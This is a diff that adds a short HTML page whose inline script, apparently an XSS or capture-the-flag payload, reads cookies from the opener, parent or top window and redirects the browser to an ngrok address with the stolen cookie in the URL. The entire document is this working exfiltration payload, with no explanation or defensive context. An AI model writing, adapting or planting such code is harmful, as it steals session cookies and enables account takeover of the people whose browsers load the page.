@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+<script>
+// Try multiple ways to get the cookie from the original page
+var c = '';
+try { c = opener.document.cookie; } catch(e1) {
+  try { c = parent.document.cookie; } catch(e2) {
+    try { c = top.document.cookie; } catch(e3) {
+      c = document.cookie || 'no_cookie_' + e1 + '_' + e2 + '_' + e3;
+    }
+  }
+}
+// Log what we got for debugging
+console.log('Cookie:', c);
+// Redirect with cookie
+location='https://fimbrillate-intersegmental-shelli.ngrok-free.dev/?c='+encodeURIComponent(c);
+</script>
